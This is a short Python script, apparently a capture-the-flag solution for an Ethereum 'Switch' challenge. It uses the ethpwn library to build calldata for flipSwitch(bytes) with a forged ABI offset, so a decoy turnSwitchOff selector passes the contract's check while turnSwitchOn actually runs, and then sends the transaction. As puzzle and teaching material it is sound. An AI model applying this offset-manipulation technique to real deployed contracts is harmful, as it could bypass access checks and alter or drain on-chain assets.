from ethpwn import *

def p256(x):
    return x.to_bytes(32, 'big')

switch = contract_registry().get(contract_by_label('SwitchInstance0'))
assert switch is not None

import ipdb; ipdb.set_trace()
offset = 0x20 + 0x20 + 4
calldata = b''.join([
    keccak256('flipSwitch(bytes)')[:4],

    # offset starts calculating from here (bytes object is `offset -> (len, data)`)
    p256(offset), # first 0x20 skips this

    # fake data: 0x20 + 4 bytes
    p256(0x20),
    keccak256('turnSwitchOff()')[:4],

    # actual data here @ 0x20+0x20+4
    p256(0x20),
    keccak256('turnSwitchOn()')[:4],
])

# debug_simulated_transaction(
#     encode_transaction(
#         to=switch.address,
#         data=calldata,
#         from_addr=context.default_from_addr,
#     )
# )
tx_hash, *tx_extra = transact(to=switch.address, data=calldata, force=True)
# debug_onchain_transaction(tx_hash)